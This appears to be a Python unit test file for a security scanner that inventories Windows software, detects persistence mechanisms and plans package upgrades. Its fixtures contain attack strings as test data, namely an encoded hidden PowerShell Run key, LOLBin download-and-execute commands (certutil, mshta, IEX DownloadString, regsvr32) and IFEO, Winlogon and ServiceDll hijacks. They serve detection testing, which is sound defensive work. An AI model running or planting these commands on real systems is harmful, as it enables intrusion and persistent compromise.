import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from scs import executor, fleet, plan, shell
from scs.analyze import build_findings
from scs.collectors import windows as wc
from scs.malware import windows_persistence as wp
from scs.malware.rules import evaluate
from scs.models import Advisory, Package
from scs.policy import Decisions
from scs.windows import FakeRegistry, exe_from_command, signer_name

UNINSTALL = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
REG = FakeRegistry({
    f"{UNINSTALL}\\Git_is1": {"DisplayName": "Git", "DisplayVersion": "2.39.1", "Publisher": "The Git Development Community",
                              "DisplayIcon": r"C:\Program Files\Git\mingw64\share\git\git-for-windows.ico"},
    f"{UNINSTALL}\\{{PY}}": {"DisplayName": "Python 3.12.4 (64-bit)", "DisplayVersion": "3.12.4150.0"},
    f"{UNINSTALL}\\KB123": {"DisplayName": "Security Update for X", "DisplayVersion": "1", "ReleaseType": "Security Update"},
    f"{UNINSTALL}\\Hidden": {"DisplayName": "Runtime piece", "DisplayVersion": "1", "SystemComponent": 1},
    r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run": {
        "OneDrive": r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background',
        "Updater": r"powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"},
    r"HKLM\SYSTEM\CurrentControlSet\Services\GoodSvc": {"ImagePath": r'"C:\Program Files\Vendor\svc.exe"', "Start": 2, "Type": 16},
    r"HKLM\SYSTEM\CurrentControlSet\Services\BadSvc": {"ImagePath": r"C:\Program Files\Some Tool\agent.exe -k", "Start": 2, "Type": 16},
    r"HKLM\SYSTEM\CurrentControlSet\Services\Drv": {"ImagePath": r"System32\drivers\x.sys", "Start": 2, "Type": 1},
    r"HKLM\SYSTEM\CurrentControlSet\Services\Shared": {"ImagePath": r"%SystemRoot%\system32\svchost.exe -k netsvcs", "Start": 2, "Type": 32},
    r"HKLM\SYSTEM\CurrentControlSet\Services\Shared\Parameters": {"ServiceDll": r"C:\Users\Public\evil.dll"},
    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe": {"Debugger": r"C:\Windows\System32\cmd.exe"},
    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon": {"Shell": "explorer.exe",
                                                                   "Userinit": r"C:\Windows\system32\userinit.exe,C:\Temp\x.exe,"},
})

WINGET_LIST = ("\r-\r\\\r|\r \r"
               "Name                         Id                      Version      Available    Source\n"
               "-----------------------------------------------------------------------------------\n"
               "Git                          Git.Git                 2.39.1       2.47.0       winget\n"
               "7-Zip 23.01 (x64)            7zip.7zip               23.01                     winget\n"
               "Microsoft Edge               Microsoft.Edge          130.0.2849.5\n"
               "Some MSIX app                MSIX\\Foo_1.0_x64__abc   1.0\n"
               "2 upgrades available.\n")
WINGET_UPGRADE = ("Name   Id        Version  Available  Source\n"
                  "-----------------------------------------------\n"
                  "Git    Git.Git   2.39.1   2.47.0     winget\n")


class InventoryTests(unittest.TestCase):
    def test_registry_programs(self):
        by = {p.name: p for p in wc.installed_programs(REG)}
        self.assertEqual(set(by), {"Git", "Python 3.12.4 (64-bit)"})
        self.assertEqual(by["Git"].meta["cpe"], ("git-scm", "git"))
        self.assertEqual(by["Python 3.12.4 (64-bit)"].version, "3.12.4")

    def test_winget_table(self):
        pk = {p.name: p for p in wc.winget_packages(WINGET_LIST, WINGET_UPGRADE)}
        self.assertEqual(set(pk), {"Git.Git", "7zip.7zip"})  # entries without a winget source are skipped
        self.assertTrue(pk["Git.Git"].meta["outdated"])
        self.assertEqual(pk["Git.Git"].meta["latest"], "2.47.0")
        self.assertFalse(pk["7zip.7zip"].meta["outdated"])

    def test_choco(self):
        pk = wc.choco_packages("Chocolatey v2.2.2\ngit|2.39.1\nnodejs-lts|20.10.0\n", "git|2.39.1|2.47.0|false\n")
        by = {p.name: p for p in pk}
        self.assertEqual(set(by), {"git", "nodejs-lts"})
        self.assertEqual(by["git"].meta["latest"], "2.47.0")

    def test_scoop_from_disk(self):
        root = Path(tempfile.mkdtemp())
        for v in ("2.39.1", "2.40.0"):
            (root / "apps" / "git" / v).mkdir(parents=True)
        cur = root / "apps" / "git" / "current"
        cur.mkdir()
        (cur / "manifest.json").write_text(json.dumps({"version": "2.40.0"}))
        (cur / "install.json").write_text(json.dumps({"bucket": "main"}))
        (root / "buckets" / "main" / "bucket").mkdir(parents=True)
        (root / "buckets" / "main" / "bucket" / "git.json").write_text(json.dumps({"version": "2.47.0"}))
        p = wc.scoop_packages([root])[0]
        self.assertEqual((p.name, p.version, p.meta["outdated"], p.meta["latest"]), ("git", "2.40.0", True, "2.47.0"))
        self.assertEqual(p.meta["installed_versions"], ["2.39.1", "2.40.0"])


class PersistenceTests(unittest.TestCase):
    def test_command_parsing(self):
        self.assertEqual(exe_from_command(r'"C:\Program Files\X\x.exe" /s'), r"C:\Program Files\X\x.exe")
        self.assertEqual(exe_from_command(r"C:\Tools\a.exe -k"), r"C:\Tools\a.exe")
        self.assertEqual(signer_name('CN="Google LLC", O=Google LLC, L=Mountain View'), "Google LLC")

    def test_rules(self):
        self.assertIn("WIN_ENCODED_PS", {h.rule for h in evaluate("powershell -NoP -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi")})
        for s in ("mshta https://x.y/a.hta", "certutil.exe -urlcache -split -f http://x/a.exe a.exe",
                  "IEX (New-Object Net.WebClient).DownloadString('http://x')", "regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"):
            self.assertIn("WIN_LOLBIN", {h.rule for h in evaluate(s)}, s)

    def test_run_keys_services_hijacks(self):
        items = wp.run_key_items(REG) + wp.service_items(REG)
        by = {i["label"]: i for i in items}
        self.assertEqual(set(by), {"OneDrive", "Updater", "GoodSvc", "BadSvc", "Shared"})  # driver skipped
        self.assertTrue(by["BadSvc"]["unquoted"])
        self.assertFalse(by["GoodSvc"]["unquoted"])
        self.assertEqual(by["Shared"]["program"], r"C:\Users\Public\evil.dll")  # svchost resolved to ServiceDll
        sigs = {r"C:\Program Files\Microsoft OneDrive\OneDrive.exe": {"status": "Valid", "subject": "CN=Microsoft Corporation"},
                r"C:\Program Files\Vendor\svc.exe": {"status": "Valid", "subject": "CN=Vendor"},
                r"C:\Program Files\Some Tool\agent.exe": {"status": "NotSigned", "subject": ""},
                r"C:\Users\Public\evil.dll": {"status": "HashMismatch", "subject": "CN=Microsoft Windows"},
                "powershell.exe": {"status": "Valid", "subject": "CN=Microsoft Windows"}}
        f = {x.meta["item"]["label"]: x for x in wp.audit_items(items, sigs)}
        self.assertNotIn("OneDrive", f)
        self.assertNotIn("GoodSvc", f)
        self.assertIn(f["Updater"].severity, ("high", "critical"))
        self.assertEqual(f["Shared"].severity, "critical")
        self.assertIn("UNQUOTED_SERVICE_PATH", f["BadSvc"].rules)
        hij = {x.rules[0] for x in wp.hijack_points(REG)}
        self.assertEqual(hij, {"IFEO_DEBUGGER", "WINLOGON_USERINIT"})

    def test_tasks_and_wmi(self):
        tasks = wp.task_items({"Name": "Updater", "Path": "\\", "Author": "x",
                               "Actions": ["C:\\Users\\me\\AppData\\Local\\Temp\\u.exe", "cmd /c echo hi"]})
        self.assertEqual(len(tasks), 2)
        f = wp.audit_items(tasks, {"C:\\Users\\me\\AppData\\Local\\Temp\\u.exe": {"status": "NotSigned", "subject": ""}})
        self.assertIn("TEMP_LOCATION", f[0].rules)
        wmi = wp.wmi_items([{"Class": "CommandLineEventConsumer", "Name": "x", "Command": "powershell -enc AAAAAAAAAAAAAAAAAAAAAAAAAAAA"},
                            {"Class": "LogFileEventConsumer", "Name": "log"}])
        self.assertEqual([w["label"] for w in wmi], ["x"])
        self.assertIn(wp.audit_items(wmi, {})[0].severity, ("high", "critical"))

    def test_signer_change(self):
        f = wp.program_signatures([{"name": "Tool", "exe": "C:\\t.exe"}],
                                  {"C:\\t.exe": {"status": "Valid", "subject": "CN=Other Corp"}}, {"C:\\t.exe": "CN=Tool Inc"})
        self.assertEqual((f[0].severity, f[0].rules), ("critical", ["SIGNER_CHANGED"]))


class CmdShellPlanTests(unittest.TestCase):
    def setUp(self):
        self.orig = plan.SH
        plan.SH = shell.Cmd()

    def tearDown(self):
        plan.SH = self.orig

    def test_quoting_and_adapt(self):
        c = shell.Cmd()
        self.assertEqual(c.q(r"C:\work\app"), r"C:\work\app")
        self.assertEqual(c.q("qs@^6.5.3"), '"qs@^6.5.3"')  # ^ is cmd's escape char
        self.assertEqual(c.q("requests>=2.32"), '"requests>=2.32"')  # > would redirect
        self.assertEqual(c.cd(r"C:\My Projects\x"), r'cd /d "C:\My Projects\x"')
        self.assertEqual(c.adapt("npm update qs   # if still old: overrides"), "npm update qs")
        self.assertEqual(c.adapt("# Homebrew cannot downgrade"), "rem Homebrew cannot downgrade")
        self.assertEqual(executor.missing_tools([r'cd /d "C:\x y" && C:\definitely\missing.exe /s'], "cmd"),
                         [r"C:\definitely\missing.exe"])

    def test_windows_plan_and_script(self):
        d = tempfile.mkdtemp()
        p = Package("npm", "qs", "6.5.2", "lockfile", f"{d}/package-lock.json", direct=False,
                    meta={"project": d, "lockfile": "package-lock.json"})
        findings, _ = build_findings([p], {p.key: [Advisory("GHSA-1", severity="HIGH", fixed=["6.5.3"])]}, [])
        result = {"host": "win", "started": "s", "findings": [f.to_dict() for f in findings], "outdated": [
            {"name": "Git.Git", "version": "2.39.1", "latest": "2.47.0", "kind": "winget", "source": "winget",
             "ecosystem": "winget", "location": "winget:Git.Git"},
            {"name": "git", "version": "2.40.0", "latest": "2.47.0", "kind": "scoop", "source": "scoop",
             "ecosystem": "scoop", "location": "C:/Users/me/scoop/apps/git", "meta": {"root": "C:/Users/me/scoop"}},
            {"name": "7zip", "version": "23.1", "latest": "24.8", "kind": "choco", "source": "choco", "ecosystem": "chocolatey"}]}
        pl = plan.build(result, Decisions(Path(tempfile.mkdtemp()) / "d.json"), suggested=True, include_outdated=True, min_age=0)
        self.assertEqual(pl["shell"], "cmd")
        kinds = {t["kind"]: t for t in pl["targets"]}
        self.assertEqual(set(kinds), {"project", "winget", "scoop", "choco"})
        self.assertTrue(kinds["project"]["change"][0].startswith(f"cd /d {d} && npm update qs"))
        self.assertIn('"%BACKUP%\\winget-export.json"', kinds["winget"]["backup"][0])
        self.assertIn("scoop reset git@2.40.0", kinds["scoop"]["rollback"])
        self.assertTrue(kinds["choco"]["elevate"])  # runs through a UAC prompt
        self.assertIn("--accept-source-agreements", kinds["winget"]["change"][0])
        script = plan.to_script(pl)
        self.assertIn(":target_1", script)
        self.assertIn("|| exit /b 1", script)
        self.assertNotIn("#", "\n".join(c for t in pl["targets"] for c in t["change"]))

    def test_choco_requires_admin(self):
        t = {"kind": "choco", "id": "choco", "title": "Chocolatey", "warnings": [], "packages": [],
             "backup": [], "change": ["choco upgrade git -y"], "verify": [], "rollback": [], "manual": [], "meta": {}}
        with mock.patch.dict("os.environ", {"XDG_DATA_HOME": tempfile.mkdtemp()}), \
                mock.patch.object(executor, "is_admin", return_value=False), \
                mock.patch.object(executor, "missing_tools", return_value=[]):
            out: list[str] = []
            rec = executor.Runner({"targets": [t], "shell": "cmd"}, "p", executor.Options(yes=True, out=out.append)).execute([1])
        self.assertEqual(rec["targets"][0]["status"], "skipped")
        self.assertTrue(any("Administrator" in o for o in out))


class FleetTests(unittest.TestCase):
    def bundle(self, host, pkgs_advs, respond=False, malware=None):
        pkgs = [p for p, _ in pkgs_advs]
        findings, _ = build_findings(pkgs, {p.key: a for p, a in pkgs_advs}, [])
        return {"bundle_version": 1, "host": host, "exported": "2026-10-26T10:00:00+07:00", "os": "Ubuntu 24.04",
                "scan": {"started": "2026-10-26T09:00:00+07:00", "summary": {"buckets": {}, "severity": {}},
                         "inventory": {"total": len(pkgs)}, "outdated": [], "findings": [f.to_dict() for f in findings]},
                "malware": malware}

    def test_merge(self):
        lib = lambda: Package("PyPI", "requests", "2.19.0", "pip", "/e")  # noqa: E731
        adv = lambda: [Advisory("GHSA-x", aliases=["CVE-2018-18074"], severity="HIGH", fixed=["2.20.0"], kev=True)]  # noqa: E731
        bad = Package("npm", "chalk", "5.6.1", "lockfile", "/p/package-lock.json", meta={"project": "/p", "lockfile": "package-lock.json"})
        mw = {"started": "s", "counts": {"critical": 1, "high": 0}, "exposure": [{"state": "UNENCRYPTED"}],
              "findings": [{"check": "persistence", "severity": "critical", "title": "run-key: Updater", "rules": ["WIN_ENCODED_PS"], "path": "HKCU\\Run"}]}
        b1 = self.bundle("dev-mac", [(lib(), adv()), (bad, [Advisory("MAL-1", malicious=True)])])
        b2 = self.bundle("build-ubuntu", [(lib(), adv())], malware=mw)
        b3 = self.bundle("win-laptop", [(Package("npm", "chalk", "5.6.1", "npm-global", "/g"), [Advisory("MAL-1", malicious=True)])], malware=mw)
        m = fleet.merge([b1, b2, b3])
        ranked = [(v["name"], v["host_count"]) for v in m["vulnerabilities"]]
        self.assertEqual(ranked, [("chalk", 2), ("requests", 2)])  # malicious (score 100) outranks HIGH at equal spread
        self.assertEqual(m["cves"][0]["cve"], "CVE-2018-18074")
        self.assertTrue(m["cves"][0]["kev"])
        self.assertEqual(m["shared_ioc_hosts"], ["dev-mac", "win-laptop"])
        self.assertEqual(len(m["malware"][0]["hosts"]), 2)
        self.assertEqual(next(h for h in m["hosts"] if h["host"] == "build-ubuntu")["unencrypted_ssh_keys"], 1)
        from scs.report.fleet import render_html
        self.assertIn("Most widespread vulnerable packages", render_html(m))

    def test_host_normalization(self):
        from scs.util import normalize_host
        self.assertEqual(normalize_host("Dev-Laptop-01.local"), normalize_host("dev-laptop-01"))
        b = self.bundle("Laptop.local", [])
        b_old = dict(b, host="laptop", exported="2026-10-25T10:00:00+07:00")
        self.assertEqual([h["host"] for h in fleet.merge([b, b_old])["hosts"]], ["laptop"])  # same machine, newest wins

    def test_redaction(self):
        self.assertEqual(fleet._redact({"p": ["/Users/me/RnD/x", 3], "/Users/me/proj": {"a": 1}}, "/Users/me"),
                         {"p": ["~/RnD/x", 3], "~/proj": {"a": 1}})


if __name__ == "__main__":
    unittest.main()
